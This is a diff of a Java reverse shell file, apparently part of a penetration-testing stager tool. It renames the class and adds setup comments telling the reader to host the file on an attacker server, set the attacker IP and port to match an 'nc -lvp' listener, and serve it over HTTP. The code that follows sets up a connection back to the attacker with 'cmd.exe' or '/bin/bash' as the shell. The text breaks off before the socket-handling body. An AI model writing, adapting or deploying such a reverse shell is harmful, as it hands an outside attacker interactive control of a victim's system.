@@ -1,4 +1,3 @@
-
 import java.net.Socket;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -26,21 +25,35 @@ import java.io.OutputStream;
  * This reverse shell is based pretty much on this gist:
  * 
  *   https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
+ * 
+ * 1) Save a copy of this file to your attacker server.
+ * 2) Replace "class TCPReverseShell" with "class Payload"
+ * 3) Rename the file to "Payload.java"
+ * 4) Alter the attacker to your hostname/ip
+ * 5) set the port to match your "nc -lvp <port>"
+ * 6) Start an HTTP server 
+ * 
+ * You can use Apache, Nginx or python as per this blog:
+ * 
+ *   https://cornerpirate.com/2016/12/16/simple-http-or-https-servers/
+ * 
+ * The reason for renaming the class is because it would baffle Stager to 
+ * have a class called Payload living inside it. That would be ambiguous. 
  *
  * @author cornerpirate
  */
-public class payload {
+public class TCPReverseShell {
 
     /**
      * This method is called when the payload is compiled and executed. I am
-     * showing a reverse shell.
+     * showing a reverse shell here for Windows.
      */
-    public void revshell() {
+    public static void Run() {
 
         try {
 
             // IP address or hostname of attacker
-            String attacker = "SETME";
+            String attacker = "SETME"; 
             int port = 8044;
             // For a windows target do this. For linux "/bin/bash"
             String cmd = "cmd.exe";
